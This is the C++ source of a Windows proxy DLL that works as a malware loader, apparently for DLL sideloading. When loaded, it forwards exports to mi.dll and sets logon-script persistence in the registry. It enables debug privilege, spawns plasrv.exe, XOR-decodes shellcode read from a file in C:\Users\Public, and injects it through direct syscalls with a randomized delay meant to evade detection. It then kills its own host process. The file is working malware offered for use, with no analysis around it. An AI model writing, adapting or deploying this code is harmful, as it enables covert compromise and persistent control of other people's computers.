// DLL Proxy
#include <Shellapi.h>
#include "pch.h"
#include <tchar.h>
#include <stdio.h>
#include <thread>
#include "direct.h"
#include <Shlobj.h>
#include <Shlwapi.h>
#include <psapi.h>
#include <comdef.h>
#include <tlhelp32.h>
#include "syscall.h"

#pragma comment(linker, "/export:MI_Application_InitializeV1=C:\\Windows\\System32\\mi.MI_Application_InitializeV1")
#pragma comment(linker, "/export:mi_clientFT_V1=C:\\Windows\\System32\\mi.mi_clientFT_V1")



void Hook_Init();
std::thread hookthread;
char shellcode[307296];
int findMyProc(const char* procname) {
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;
	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);
	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);
	// retrieve information about the processes
	// and exit if unsuccessful
	while (hResult) {
		// if we find the process: return process ID
		if (strcmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}
	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}
void EnableDebugPriv()
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkp;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL);
	CloseHandle(hToken);
}
void readShellcode() {
	char shellcodeDir[255] = "C:\\Users\\Public\\shell.dat";
	FILE* file;
	fopen_s(&file, shellcodeDir, "rb");
	fread(shellcode, sizeof(shellcode), 1, file);
	fclose(file);
}
void run(HANDLE processHandle) {
	HANDLE remoteThread;
	SIZE_T len = sizeof(shellcode);
	PVOID remoteBuffer;
	// remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	Sw3NtAllocateVirtualMemory(processHandle, &remoteBuffer, 0, &len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	// WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	Sw3NtWriteVirtualMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL);
	srand(clock());
	int num = ((rand() % (100 - 1 + 1)) + 1) * 200;
	Sleep(num);
	// CreateRemoteThread(processHandle, nullptr, NULL, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	Sw3NtCreateThreadEx(&remoteThread, GENERIC_EXECUTE, NULL, processHandle, remoteBuffer, NULL, FALSE, 0, 0, 0, NULL);
	CloseHandle(processHandle);
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH: {
		{
			switch (fdwReason)
			{
			case DLL_PROCESS_ATTACH: {
				HKEY hkey = NULL;
				LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"Software\\Classes\\87983e9e-fe92-11ed-be56-0242ac120002", 0, KEY_WRITE, &hkey);
				if (res == ERROR_SUCCESS) {
					char value[255] = { 0 };
					DWORD BufferSize = 255;
					RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"Software\\Classes\\87983e9e-fe92-11ed-be56-0242ac120002", "4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
					Sleep(100);
					if (value[0] != 0) {
						remove(value);
						RegSetValueEx(hkey, (LPCSTR)"4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", 0, REG_SZ, NULL, NULL);
					}
					else {
					}
					RegCloseKey(hkey);
				}
				HKEY hkey2 = NULL;
				TCHAR szFileName[MAX_PATH];
				GetModuleFileName(NULL, szFileName, MAX_PATH);
				// startup
				LONG res2 = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"Environment", 0, KEY_WRITE, &hkey2);
				if (res2 == ERROR_SUCCESS) {
					char value[255] = { 0 };
					DWORD BufferSize = 255;
					RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"Environment", "UserInitMprLogonScript", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
					if (value[0] != 0) {
					}
					else {
						RegSetValueEx(hkey2, (LPCSTR)"UserInitMprLogonScript", 0, REG_SZ, (unsigned char*)szFileName, strlen(szFileName));
					}
					RegCloseKey(hkey2);
				}
				EnableDebugPriv();
				HANDLE processHandle;
				BOOL bSuccess = FALSE;
					LPTSTR pszCmd = NULL;
					PROCESS_INFORMATION pi = { 0 };
					STARTUPINFO si = { 0 };
					si.cb = sizeof(si);
						bSuccess = CreateProcess(NULL, (LPSTR)"C:\\Windows\\System32\\plasrv .exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
					if (bSuccess)
					{
						int upid = GetProcessId(pi.hProcess);
						processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(upid));
					}
						// ResumeThread(processHandle);
						//char pid[10];
						//_itoa_s(upid, pid, 10);
						//MessageBox(0, pid, "DEBUG", 0);
					else {
						exit(1);
					}
				readShellcode();
				// XOR shellcode
				char key[] = "KVEcSujcUCK8hJahx92r3JLELBKPLIE2o5kgnJLD4Hbt7LPW1Oie4z";
				int keysize = sizeof(key);
				int i;
				for (i = 0; i < sizeof(shellcode); i++) {
					shellcode[i] = key[i % keysize] ^ shellcode[i];
				}
				// Inject
				run(processHandle);
				// Self kill
				int pid = GetCurrentProcessId();
				char cid[10];
				_itoa_s(pid, cid, 10);
				STARTUPINFO siStartupInfo;
				PROCESS_INFORMATION piProcessInfo;
				memset(&siStartupInfo, 0, sizeof(siStartupInfo));
				memset(&piProcessInfo, 0, sizeof(piProcessInfo));
				siStartupInfo.cb = sizeof(siStartupInfo);
				char command[] = "cmd /c taskkill /F /PID";
				strcat_s(command, cid);
				int done = CreateProcess(NULL, (LPTSTR)command, NULL, NULL, TRUE, CREATE_NEW_PROCESS_GROUP, NULL, NULL, &siStartupInfo, &piProcessInfo);
			}
			case DLL_PROCESS_DETACH:
				hookthread.detach();
				// Code to run when the DLL is freed
				break;

			case DLL_THREAD_ATTACH:
				// Code to run when a thread is created during the DLL's lifetime
				break;
			case DLL_THREAD_DETACH:
				// Code to run when a thread ends normally.
				break;
			}
			return TRUE;
		}
	}
	}
}
